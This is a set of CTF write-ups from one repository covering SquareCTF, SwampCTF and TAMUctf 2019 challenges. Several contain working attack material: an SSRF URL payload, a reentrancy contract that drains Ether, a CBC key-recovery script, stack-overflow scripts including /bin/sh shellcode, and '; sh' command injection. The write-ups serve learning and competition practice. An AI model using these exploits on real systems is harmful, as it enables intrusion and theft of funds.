### File: CTF_Writeups/2019/SquareCTF_2019/inwasmble/README.md

# inwasmble

![](./_images/logo.png)

We're initially provided with a simple web [page](https://2019.squarectf.com/static/files/7a32fbe18afbbd9f_inwasmble.html).

![](./_images/page.png)

We can provide input:

![](./_images/error.png)

Putting a break point in the Firefox console lets us walkthrough the operation of the box.

![](./_images/console.png)

Inspection into the source code of the web page gives us this `javascript`:

```javascript
var code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x05, 0x01, 0x60,
    0x00, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x05, 0x03, 0x01, 0x00, 0x01,
    0x07, 0x15, 0x02, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00,
    0x08, 0x76, 0x61, 0x6c, 0x69, 0x64, 0x61, 0x74, 0x65, 0x00, 0x00, 0x0a,
    0x87, 0x01, 0x01, 0x84, 0x01, 0x01, 0x04, 0x7f, 0x41, 0x00, 0x21, 0x00,
    0x02, 0x40, 0x02, 0x40, 0x03, 0x40, 0x20, 0x00, 0x41, 0x20, 0x46, 0x0d,
    0x01, 0x41, 0x02, 0x21, 0x02, 0x41, 0x00, 0x21, 0x01, 0x02, 0x40, 0x03,
    0x40, 0x20, 0x00, 0x20, 0x01, 0x46, 0x0d, 0x01, 0x20, 0x01, 0x41, 0x04,
    0x6c, 0x41, 0x80, 0x02, 0x6a, 0x28, 0x02, 0x00, 0x20, 0x02, 0x6c, 0x21,
    0x02, 0x20, 0x01, 0x41, 0x01, 0x6a, 0x21, 0x01, 0x0c, 0x00, 0x0b, 0x0b,
    0x20, 0x00, 0x41, 0x04, 0x6c, 0x41, 0x80, 0x02, 0x6a, 0x20, 0x02, 0x41,
    0x01, 0x6a, 0x36, 0x02, 0x00, 0x20, 0x00, 0x2d, 0x00, 0x00, 0x20, 0x00,
    0x41, 0x80, 0x01, 0x6a, 0x2d, 0x00, 0x00, 0x73, 0x20, 0x00, 0x41, 0x04,
    0x6c, 0x41, 0x80, 0x02, 0x6a, 0x2d, 0x00, 0x00, 0x47, 0x0d, 0x02, 0x20,
    0x00, 0x41, 0x01, 0x6a, 0x21, 0x00, 0x0c, 0x00, 0x0b, 0x0b, 0x41, 0x01,
    0x0f, 0x0b, 0x41, 0x00, 0x0b, 0x0b, 0x27, 0x01, 0x00, 0x41, 0x80, 0x01,
    0x0b, 0x20, 0x4a, 0x6a, 0x5b, 0x60, 0xa0, 0x64, 0x92, 0x7d, 0xcf, 0x42,
    0xeb, 0x46, 0x00, 0x17, 0xfd, 0x50, 0x31, 0x67, 0x1f, 0x27, 0x76, 0x77,
    0x4e, 0x31, 0x94, 0x0e, 0x67, 0x03, 0xda, 0x19, 0xbc, 0x51
  ]);
  
  var wa = new WebAssembly.Instance(new WebAssembly.Module(code));
  var buf = new Uint8Array(wa.exports.memory.buffer);
  
  async function go() {
    sizes = [...[...Array(4)].keys()].map(x=>x*128);
    buf.set(x.value.substr(sizes[0], sizes[1]).padEnd(sizes[1]).split('').map(x=>x.charCodeAt('')));
    if (wa.exports.validate()) {
      hash = await window.crypto.subtle.digest("SHA-1", buf.slice(sizes[2], sizes[3]));
      r.innerText = "\uD83D\uDEA9 flag-" + [... new Uint8Array(hash)].map(x => x.toString(16)).join('');
    } else {
      r.innerHTML = x.value == "" ? "&nbsp;" : "\u26D4";
    }
}
```

As it can be seen we will have to reverse some `WebAssembly`!

`WebAssembly` is effectively a portable binary code format that can be used to imbed assembly code into websites.

Stepping further into the code gives us this `WebAssembly` code:

```wat
(module
  (type $type0 (func (result i32)))
  (memory (;0;) 1)
  (export "memory" (memory 0))
  (export "validate" (func $func0))
  (func $func0 (result i32)
    (local $var0 i32) (local $var1 i32) (local $var2 i32) (local $var3 i32)
    i32.const 0
    set_local $var0
    block $label3
      block $label0
        loop $label4
          get_local $var0
          i32.const 32
          i32.eq
          br_if $label0
          i32.const 2
          set_local $var2
          i32.const 0
          set_local $var1
          block $label1
            loop $label2
              get_local $var0
              get_local $var1
              i32.eq
              br_if $label1
              get_local $var1
              i32.const 4
              i32.mul
              i32.const 256
              i32.add
              i32.load
              get_local $var2
              i32.mul
              set_local $var2
              get_local $var1
              i32.const 1
              i32.add
              set_local $var1
              br $label2
            end $label2
          end $label1
          get_local $var0
          i32.const 4
          i32.mul
          i32.const 256
          i32.add
          get_local $var2
          i32.const 1
          i32.add
          i32.store
          get_local $var0
          i32.load8_u
          get_local $var0
          i32.const 128
          i32.add
          i32.load8_u
          i32.xor
          get_local $var0
          i32.const 4
          i32.mul
          i32.const 256
          i32.add
          i32.load8_u
          i32.ne
          br_if $label3
          get_local $var0
          i32.const 1
          i32.add
          set_local $var0
          br $label4
        end $label4
      end $label0
      i32.const 1
      return
    end $label3
    i32.const 0
  )
  (data (i32.const 128)
    "Jj[`\a0d\92}\cfB\ebF\00\17\fdP1g\1f'vwN1\94\0eg\03\da\19\bcQ"
  )
)
```

After a long time stepping through the code it can be seen that the code is xoring the entered characters with the 
data string `"Jj[``\a0d\92}\cfB\ebF\00\17\fdP1g\1f'vwN1\94\0eg\03\da\19\bcQ"`.

From the example below the stack contains the character entered 104 (`h`) and the xor value 74 (`J` the first value of the Xor string)

![](./_images/xor.png)

Jumping to next check `i32.ne` that checks for equality:

![](./_images/ne.png)

Looking at the stack gives the output of the pervious XOR operation and the expected value `3`.

The expected value of the password can be calculated using the xor of the character in the xor string and the expected:

```
char_of_pass = XOR_Char ^ Expected_Value
```

In this example this gives: 73 (`I`).

After further stepping through I can see that every 4 bytes from the index 256 in the scripts memory has the expected character. 

The buf slice from 256 can be seen below:

![](./_images/buf.png)

It fills in for every correct character.

After manual extracting these values from the `buf` and adding them to a very simple script:

```python
target = [
             3,   7,  43,  15, 211,  23, 251,  31, 163,  39, 203, 
            47, 115,  55, 155,  63,  67,  71, 107,  79,  19,  87, 
            59,  95, 227, 103,  11, 111, 179, 119, 219, 127
        ]

xor_string = b"Jj[`\xa0d\x92}\xcfB\xebF\x00\x17\xfdP1g\x1f'vwN1\x94\x0eg\x03\xda\x19\xbcQ"

for i, x in enumerate(xor_string):
    print(chr(x ^ target[i]), end="")

print()
```

The correct input, therefore, is:

```
Impossible is for the unwilling.
```

Entering this gives us the flag:

![](./_images/flag.png)

```
FLAG: flag-bee523b8ed974cb8929c3a5f2d89e4fb99694a2
```


### File: CTF_Writeups/2019/SwampCTF/Brokerboard/README.md


# Brokerboard
![](./brief.png)

The important part of the brief is the mentioning of the ```https://localhost/key``` endpoint. This is where the flag will most likely be returned from.


The challenge provided a web interface that fetches links.

![](./images/website.png)

As you can see from the image the url ```http://www.google.com``` has been parsed successfully. However, any attempts with localhost as the main host causes this error to be returned:

```
Ruh roh, we don't allow you to fetch internal URLs!
```

The second most important part of the brief is the hint towards the use of ```parse_url``` in the system. This will be our vulnerable entry point.

The bug used was ![#73192](https://bugs.php.net/bug.php?id=73192) of the PHP bug page. This states that the host in incorrectly parsed when the use of ```#``` after the port number of the original domain.

The payload used is below:
```
http://example.com:80#@localhost/key
```

NOTE: even though the website states that ```?``` and ```//``` can work in place of the ```#```. These were unable to work in this context.

By placing the playload into the link fetcher it circumvents the initial check for ```localhost``` while ```parse_url``` takes ```localhost/key``` as the main url.

The flag is provided like so:

![](./images/website_flag.png)

```
FLAG: flag{y0u_cANn0t_TRU5t_php}
```


### File: CTF_Writeups/2019/SwampCTF/Ghirda_Release/README.md

# Ghidra Release

![](./brief.png)

https://static.swampctf.com/ghidra_nsa_training.mp4

The video file can be found at the url above, its too big for an upload to Github.

The video is over 15hours long, therefore, a manual review to find the flag(s) will be infeasible.

The chosen method was the use of ```OpenCV``` to obtain frames from the video and ```pytesseract``` as the OCR library for text recognition on the video frames to look for the flag.

### Method

Initially I ran it through while skipping a large 2000 frames (80 seconds) for each OCR run. This luckily picked up one of the flags.

The frame detected is below:

![](./FLAGS/FLAG_3.png)

This showed the format of the challenge. The flags will appear at the bottom section of the frame. Therefore, an efficiency improvement was cropping the obtained frame.

The cropped result is below:

![](./FLAGS/FLAG_3_cropped.png)

The number of frame skipped was reduced and the algorithm was reduced to around 25 frames (1 second) jumps. This increased the execution time but allowed thorough analysis of the video's frames. 

The overall execution time was ~2hr. I don't think that is the best that could be done and would like to see more efficient solutions.

### Code

```python
import cv2 as cv2
import pytesseract
import sys  

def crop(im, x, y):
    w = 350
    h = 75
    return im[y:y+h, x:x+w]

# How many frames are skipped in one go
FRAME_SKIP = 25

# Built in openCV variables
CV_CAP_PROP_POS_FRAMES = 1
CV_CAP_PROP_FRAME_COUNT = 7

success = True
video = cv2.VideoCapture("./training.mp4")
total_frames = video.get(CV_CAP_PROP_FRAME_COUNT)

frame_val = 0

while success:

    success, frame = video.read()

    # Skips the video forward
    frame_val += FRAME_SKIP
    video.set(CV_CAP_PROP_POS_FRAMES, frame_val)
    
    # Crops the bottom of the frame, this is where the flag will appear
    crop_img = crop(frame, x=0, y=150)

    # OCR detection
    text = pytesseract.image_to_string(image=crop_img, lang="eng")

    if "FLAG" in text:
        sys.stdout.write("TEXT: ")
        sys.stdout.write(text)
        sys.stdout.write("\n")
        cv2.imwrite(f"FLAG_{frame_val}.png", crop_img)

    sys.stderr.write(f"PROGRESS: {round(frame_val / total_frames * 100, 2)}%\r")
```

The code was run and detected all sections of the flag and saved them to file

![](./FLAGS/FLAG_1.png)
![](./FLAGS/FLAG_2.png)

![](./FLAGS/FLAG_3.png)
![](./FLAGS/FLAG_4.png)

These combined provided the flag.

```
FLAG: flag{l34kfr33_n4tion4l_s3cur1ty}
```


### File: CTF_Writeups/2019/SwampCTF/Multi_Contract_Owner/README.md

# Multi-Owner Contract

![](./brief.png)

### Links
Solidity Setup: https://eth.swampctf.com/

Challenge: https://eth.swampctf.com/challenge/1

### Solution
Smart contract challenges in a CTF is a first for me, so this was a very interesting process.

We were provided with a smart contract that we had to deploy on the Ethereum Ropsten Test Network.

Below is the provided contract:

```solidity

pragma solidity ^0.4.24;

contract Ownable {

    event OwnerAdded(address);
    event OwnerRemoved(address);

    address public implementation;
    mapping (address => bool) public owners;

    modifier onlyOwner() {
        require(owners[msg.sender], "Must be an owner to call this function");
        _;
    }

    /** Only called when contract is instantiated
     */
    function contructor() public payable {
        require(msg.value == 0.5 ether, "Must send 0.5 Ether");
        owners[msg.sender] = true;
    }

    /** Add an owner to the owners list
     *  Only allow owners to add other owners
     */
    function addOwner(address _owner) public onlyOwner { 
        owners[_owner] = true;
        emit OwnerAdded(_owner);
    }

    /** Remove another owner
     *  Only allow owners to remove other owners
     */
    function removeOwner(address _owner) public onlyOwner { 
        owners[_owner] = false;
        emit OwnerRemoved(_owner);
    }

    /** Remove all owners mapping and relinquish control of contract
     */
    function renounceOwnership() public {
        assembly {
            sstore(owners_offset, 0x0)
        }
    }
    
    /** CTF helper function
     *  Used to clean up contract and return funds
     */
    function killContract() public onlyOwner {
        selfdestruct(msg.sender);
    }

    /** CTF helper function
     *  Used to check if challenge is complete
     */
    function isComplete() public view returns(bool) {
        return owners[msg.sender];
    }

}
```
The flag will be provided when we make ourselves the owner of the contract. This is show in this function:

```solidity
function isComplete() public view returns(bool) {
    return owners[msg.sender];
}
```

Initially I thought calling the ```renounceOwnership()``` method was the way forward. I assumed this would overwrite all the owners and allow me to own the contract. However, I couldn't get it working and decided to move on.


Then I noticed the spelling mistake in the name of the 'contructor()' method, this is instead of 'constructor()'. This means this method can be called again after the creation of the contract.

```solidity
function contructor() public payable {
    require(msg.value == 0.5 ether, "Must send 0.5 Ether");
    owners[msg.sender] = true;
}
```

By calling the wrongly name constructor method again I was assigned owner!

After the website infrastructure called the main contract to verify completion I was provided with a flag.

```
FLAG: flag{3v3ryb0dy5_hum4n_r34d_c10s31y}
```


### File: CTF_Writeups/2019/SwampCTF/README.md

# Swamp CTF

<img align="right" width=150 src="./logo.png"/>

### Smart-Contract

[```Multi-Contract Owner - Points:  425```](./Multi_Contract_Owner/README.md)


[```Refundable Purchase - Points: 460```](./Refundable_Purchase/README.md)

### Crypto

[```We Three Keys - Points: 144```](./We_Three_Keys/README.md)

### Web

[```Brokerboard - Points: 50```](./Brokerboard/README.md)


### Misc

[```Ghirda Release - Points: 310```](./Ghirda_Release/README.md)


### File: CTF_Writeups/2019/SwampCTF/Refundable_Purchase/README.md

# Refundable Purchase

![](./brief.png)

# Solution

Like the previous Smart Contract challenge we were provided with the source for a contract. The aim of the challenge was to drain the contract of all its Ether.

```solidity
pragma solidity ^0.4.24;

contract RefundablePurchase {

    event Refund(address, uint256);
    event PurchaseCompleted(address, uint256);

    address owner;

    mapping (address => uint256) public refunds;

    constructor() public payable {
        require(msg.value == 0.5 ether, "Must send 0.5 Ether");
    }

    /** Fallback function, called when contract receives Ether without data
     */
    function () external payable {
        require(refunds[msg.sender] + msg.value > refunds[msg.sender]); // Overflow guard
        refunds[msg.sender] += msg.value;
    }

    /** Refunds sent Ether
     */
    function refund() public {
        require(refunds[msg.sender] > 0);
        uint256 amount = refunds[msg.sender];
        msg.sender.call.value(amount)("");
        refunds[msg.sender] = 0;
        emit Refund(msg.sender, amount);
    }

    /** Call this function once you've received your purchased item
     */
    function completePurchase() public {
        require(refunds[msg.sender] > 0);
        uint256 amount = refunds[msg.sender];
        refunds[msg.sender] = 0;
        emit PurchaseCompleted(msg.sender, amount);
    }

    /** Returns balance of this contract
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /** CTF helper function
     *  Used to check if challenge is complete
     */
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

}
```

The vulnerability can be seen in the ```refund()``` method:

```solidity
function refund() public {
        require(refunds[msg.sender] > 0);
        uint256 amount = refunds[msg.sender];
        msg.sender.call.value(amount)("");
        refunds[msg.sender] = 0;
        emit Refund(msg.sender, amount);
}
```

The line below is the key element of the potential exploit:

```solidity
msg.sender.call.value(amount)("");
```

This is where we can exploit this contract. This line sends the refunded Ether to the calling address. However, what if the return address is an Ethereum contract? This will trigger the fallback function of the contract. 
In Solidity smart contracts any funds sent to a contract without any data will be processed by the **fallback** address (if defined).

We can also see that the contract values are updated after the external call with:

```solidity
refunds[msg.sender] = 0;
```

We can use the concept of fallback function on a contract we control to call the refund method again and withdraw more Ether than we have been assigned! We can repeat this as many times are we want to completely drain the contract.

This is known as a **Reentrancy Attack** and was the method used in the infamous [DAO hack](https://www.coindesk.com/understanding-dao-hack-journalists).

Below is the malicious contract used:

```solidity
pragma solidity ^0.4.24;

import "./challenge2.sol";

contract HackContract {

    RefundablePurchase public refundablePurchase;

    constructor (address _refundablePurchase) payable {
        refundablePurchase = RefundablePurchase(_refundablePurchase);
    }

    function start () {
        refundablePurchase.().value(msg.value);
        refundablePurchase.refund();
    }

    function () payable {
    if (refundablePurchase.balance >= msg.value) {
        refundablePurchase.refund();
    }
  }
}
```

The contract is constructed using the address to the target contract defined as ```refundablePurchase```.

The ```start()``` method is where the exploit will begin.

```solidity
function start () {
    refundablePurchase.().value(msg.value);
    refundablePurchase.refund();
}
```

It begins by sending some funds to pass the inital funds to pass the check of the RefundPurchase ```refund()``` function.

```solidity
function refund() public {
    require(refunds[msg.sender] > 0);
    [...]
```

It then calls the ```refund()``` function and starts the loop. The ```refund()``` function sends the refund back to the contract that then triggers the fallback function below:

```solidity
function () payable {
if (refundablePurchase.balance >= msg.value) {
    refundablePurchase.refund();
}
```

The fallback function checks if the contract has any funds left. If there are more funds to steal the method will call the ```refund()``` function again to repeat the process.

This was executed using Remix to upload the contracts to the Ropsten test network. When executing this it drains the contract of all its funds and completes the challenge to provide the flag

```
FLAG: flag{c411_15_n0t_s4f3_w1th_n0_g45_1imit}
```


### File: CTF_Writeups/2019/SwampCTF/We_Three_Keys/README.md

# We Three Keys

![](./brief.png)

The challenge provides the code used on the netcat server. I've redacted some code for legibility purposes.

```python
#!/usr/bin/env python2
from Crypto.Cipher import AES
from keys import key1, key2, key3

def main():
    print("Hello! We present you with the future kings, we three keys!")
    print("Pick your key, and pick wisely!")
    key_opt = str(raw_input("<= "))
    if key_opt == "1":
        key = key1
    elif key_opt == "2":
        key = key2
    elif key_opt == "3":
        key = key3
    else:
        print("Come on, I said we have 3!")
        exit()
    while True:
        print("1) Encrypt a message")
        print("2) Decrypt a message")
        print("3) Choose a new key")
        print("4) Exit")
        choice = str(raw_input("<= "))
        if choice == "1":
            encrypt_message(key, key)
        elif choice == "2":
            decrypt_message(key, key)
        elif choice == "3":
            key = new_key()
        else:
            exit()


if __name__=='__main__':
    main()
```

The key element here is the use of the key as the IV!

```python
encrypt_message(key, key)
```

This opens up the encryption up to the ```key == IV``` attack.

### Exploit
Because we can choose plaintext to be encrypted we have a Chosen Plaintext Attack **CPA**.

The attack begins by encrypting at least 3 blocks of plaintext

```
AES_ENCRYPT(P1, P2, P3) = C1, C2, C3
```

Then taking the ```C1``` to produce a special payload

```
CT' = C1 0 C1
```

We then take this ciphertext and decrypt it.

This then gives us:

```
PT1' PT2' PT3'
```

And:

```
PT1' ⊕ PT3' == IV (Key)
```

This relationship is due to how AES-CBC mode operates.


![](./CBC_decryption.png)

This means when we XOR ```PT1'``` and ```PT3'```

```
(Decrypt[CT1] ⊕ KEY) ⊕ (Decrypt[CT1]) == KEY
```

Meaning we've been able to extract the key!

The exploit code can be seen below:

```python
from pwn import *
import re

def split_in_blocks(ct):
    return re.findall(".{32}", ct)

def hexXor(a, b):
    """
    Produces an XOR result of two equal length Hex values
    """

    if len(a) != len(b):
        raise("Error: incorrect length in hexXor")

    length = len(a)

    binA = bin(int(a, 16))[2:].zfill(length)
    binB = bin(int(b, 16))[2:].zfill(length)

    xor = int(binA, 2) ^ int(binB, 2)

    # Format ensures that the hex values are always the same length
    hexOutput = format(xor, f"#0{length + 2}x")[2:]

    return hexOutput

def get_key(keyNumber, payload):
    r.recvuntil("<= ")
    r.sendline(f"{keyNumber}")
    r.recvuntil("<= ")
    r.sendline("1")
    r.recvuntil("<= ")
    r.sendline(payload)

    ct = r.read().decode("utf-8")

    # Hacked cipher text
    ct_blocks = split_in_blocks(ct)
    ct_blocks[1] = "00" * 16
    ct_blocks[2] = ct_blocks[0]

    r.recvuntil("<= ")
    r.sendline("2")
    r.recvuntil("<= ")
    r.sendline("".join(ct_blocks))

    ct_prime = r.read().decode("utf-8")
    ct_prime_blocks = split_in_blocks(ct_prime)

    key = hexXor(ct_prime_blocks[0], ct_prime_blocks[2])
    
    r.recvuntil("<= ")
    r.sendline("3")

    return key

r = remote("chal1.swampctf.com", 1441)

# Creation of the faked CT
pt = "41" * 16
payload = pt + pt + pt

flag = ""
flag += get_key(1, payload)
flag += get_key(2, payload)
flag += get_key(3, payload)

print(flag)
```

This gives us the output:

```
666c61677b7730775f776834745f6c347a795f6b33797a5f6d7563685f7733346b5f6372797074305f6634316c73217d
```

When decode from hex gives us the flag:
```
flag{w0w_wh4t_l4zy_k3yz_much_w34k_crypt0_f41ls!}
```



### File: CTF_Writeups/2019/TAMUctf/README.md

# TAMUctf

<img align="right" width=150 src="./logo.png"/>

### pwn

[```pwn1 - Points: 227```](./pwn1/README.md)

[```pwn3 - Points: 387```](./pwn3/README.md)

[```pwn4  - Points: 100```](./pwn4/README.md)

[```pwn5 - Points: 372```](./pwn5/README.md)




### File: CTF_Writeups/2019/TAMUctf/pwn1/README.md

# pwn1 

![](./pwn1_brief.png)

### Links
```
nc pwn.tamuctf.com 4321
```

### Solution
For this challenge we are provided with a binary.

Running checksec gives us:
```diff
[*] './pwn1'
    Arch:     i386-32-little
+    RELRO:    Partial RELRO
-    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
```

As we can see ```NX``` is enabled so we're not going to be able to run shellcode here.

The challenge asks us questions and only continues if we provide the correct response. The first two questions are trival strcmps

The second ```strcmp``` is shown below:

![](./images/pwn1_ida.png)


Question 1:
```
Q: What... is your name?\n
A: Sir Lancelot of Camelot\n
```

Question 2:
```
Q: What... is your quest?\n
A: To seek the Holy Grail.\n
```

The final question is where the overflow action is. From the decompilation we can see we need to overwrite a variable.

![](./images/pwn1_overflow_ida.png)

As it can be seen from the assembly we have a ```gets``` call with a buffer starting at ```ebp + 3Bh```.  The ```cmp``` instruction looks at ```ebp + 10h```. 

Therefore, this gives us a buffer size of 43 before we can push our value into the variable.

Below is the exploit code:

```python
from pwn import *

r = remote("pwn.tamuctf.com", 4321)

r.recvuntil("name?")
r.sendline("Sir Lancelot of Camelot")
r.recvuntil("quest?")
r.sendline("To seek the Holy Grail.")
r.recvuntil("secret?")

payload = b""
payload += b"A" * 43
payload += p32(0xdea110c8)

r.sendline(payload)
print(r.recvall().decode("utf-8"))
```

The code pushes the value of ```0xdea110c8``` into the location of the ```cmp``` instruction. When run it provides us with the flag.

```
FLAG: gigem{34sy_CC428ECD75A0D392}
```


### File: CTF_Writeups/2019/TAMUctf/pwn3/README.md

# pwn3

![](./pwn3_brief.png)

Running ```checksec``` on the binary shows us the NX isn't enabled. This means the challenge could involve some shellcode.

```diff
[*] './pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
+    PIE:      PIE enabled
```

When running the binary we get the message:

```
Take this, you might need it on your journey 0xffb26e1e!
```

This value changes with every execution. This leads me to believe this address of the start of the buffer. This will allow us exact execution of our entered shellcode.

To find the length of the vulnerable buffer we will use gdb's ```pattern``` functionality.

```
gdb-peda$ pattern create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA
5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAW
AAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A
%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%
SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAsAsAsEAs
aAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
```

This creates a cyclic string that can be used to find the location of the overflow. 
Using the created string above as input we can use the error message pointer to find the offset.

```
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x25416825 in ?? ()
```

Then putting the address into ```pattern offset``` we can find the vuln buffer length

```
gdb-peda$ pattern offset 0x25416825 
625043493 found at offset: 302
```

We can use the address returned by the message to overflow the return pointer to reach our shellcode entered into the buffer.

The exploit code used is below: 

```python
from pwn import *
import re

BUFFER_LEN = 302 
NOP = b"\x90"

def gen_shellcode(ret_address):
   
    ## Shellcode to spawn a shell
    shellcode = b""
    shellcode += b"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
    shellcode += b"\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
    shellcode += b"\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

    shellcode_length = len(shellcode)

    output = b""
    for i in range(BUFFER_LEN - shellcode_length):
        output += NOP

    output += shellcode
    output += ret_address
    
    return output

r = remote("pwn.tamuctf.com", 4323)

r.recvuntil("journey ")

# Reads the address from the stream
address = (r.read()[:10]).decode("utf-8")
return_adress = p32(int(address, 16))

payload = gen_shellcode(return_adress)

r.sendline(payload)

# Gets our flag
r.interactive()
r.close()
```

The ``NOP`` is used as a nop slide. A nop will perform no operation and move onto the next instruction. This allows us to make sure we hit our shellcode.

Running this gives us a shell. Running ```cat flag.txt``` gives us a flag.

```
FLAG: gigem{r3m073_fl46_3x3cu710n}
```


### File: CTF_Writeups/2019/TAMUctf/pwn4/README.md

# pwn4

![](./pwn4_brief.png)

This challenge was far too easy and leads me to believe it was broken.

The challenge began with the prompt:

```
ls as a service (laas)(Copyright pending)
Enter the arguments you would like to pass to ls:
```

This allows us to just pass ```; sh``` to the ```ls``` command to run a shell.

```
cat flag.txt
```

Provides us with the flag.

```
FLAG: gigem{5y573m_0v3rfl0w}
```



### File: CTF_Writeups/2019/TAMUctf/pwn5/README.md

# pwn5

![](./pwn5_brief.png)

In a similar way to pwn4 we were prompted with:

```
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
```

This had a string restriction on the string but still allowed ```;sh```. This provided us with a shell to once again ```cat flag.txt```.

Once again, this challenge was broken and the solution was far too simple.

```
FLAG: gigem{r37urn_0r13n73d_pr4c71c3}
```


### File: CTF_Writeups/README.md

# CTF Writeups

### Team CTFtime Profile
https://ctftime.org/team/68942

| Pos |  Name                 |       Write-up                                 |    CTFtime Link               | 
|----:|-----------------------|------------------------------------------------|-------------------------------|
| **2019**
| 120 | Square CTF    <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/SquareCTF_2019/logo.png" align="right" height="30" width="30" ></a>      | [Write up](./2019/SquareCTF_2019/README.md)    | https://ctftime.org/event/714 |
| 59  | NACTF         <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/NACTF/logo.png" align="right" height="30" width="30" ></a>               | [Write up](./2019/NACTF/README.md)             | https://ctftime.org/event/869 |
|     | Google CTF    <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/GoogleCTF/logo.png" align="right" height="30" width="80" ></a>           | [Write up](./2019/GoogleCTF/README.md)         | https://ctftime.org/event/809 |
| 190 | Facebook CTF  <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/FacebookCTF/logo.png" align="right" height="30" width="30" ></a>         | [Write up](./2019/FacebookCTF/README.md)       | https://ctftime.org/event/781 |
| 35  | SwampCTF      <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/SwampCTF/logo.png" align="right" height="30" width="30" ></a>            | [Write up](./2019/SwampCTF/README.md)          | https://ctftime.org/event/779 |
| 108 | ENCRYPT CTF   <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/ENCRYPT/logo.png" align="right" height="30" width="30" ></a>             | [Write up](./2019/ENCRYPT/README.md)           | https://ctftime.org/event/771 |
| 68  | b00t2root '19             | [Write up](./2019/Boot2Root/README.md)         | https://ctftime.org/event/780 |
| 194 | TAMUctf       <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/TAMUctf/logo.png" align="right" height="30" width="30" ></a>             | [Write up](./2019/TAMUctf/README.md)           | https://ctftime.org/event/740 |
| **2018**
|  97 | Square CTF    <a href="url"><img src="https://github.com/AidanFray/CTF_Writeups/blob/master/2019/SquareCTF_2019/logo.png" align="right" height="30" width="30" ></a>         |  [Write up](./2018/SquareCTF_2018/README.md)   | https://ctftime.org/event/695 |

